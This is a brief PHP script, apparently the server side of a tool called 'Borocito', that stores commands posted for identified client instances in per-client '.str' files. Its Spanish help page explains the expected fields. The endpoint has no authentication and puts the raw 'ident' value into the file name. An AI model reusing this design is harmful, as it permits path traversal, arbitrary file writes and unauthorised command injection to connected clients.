<?php
	if (isset($_POST['ident']) && $_POST['ident']!="") {
		$file = "[" . $_POST["ident"]. "]Command.str";
		if (isset($_POST['text']) && $_POST['text']!="") {
			if (file_exists($file)) {
				if (isset($_POST['text'])) {
					file_put_contents($file, $_POST['text']);
				}
			} else {
				$myfile = fopen($file, "w") or die("Unable to open file!");
				$log = $_POST['text'];
				fwrite($myfile, $log);
				fclose($myfile);
			}
		}
	} else {
		die("
<h1>Administración de comandos</h1>
<h3>Borocito Server-Side</h3>
<p>
	<li>Envia <em>UID as ident</em> y <em>command as text</em>, y guarda el contenido en el archivo de Comando (.str)</li>
	<ul>
		<strong>Uso</strong>:
		<pre>
	[POST form-data:
		params:
			ident
			text
	]
		</pre>
		<ul>
			<li>ident: UID from Borocito CLI Instance</li>
			<li>text: String content to save</li>
		</ul>
	</ul>
</p>
		");
	}
?>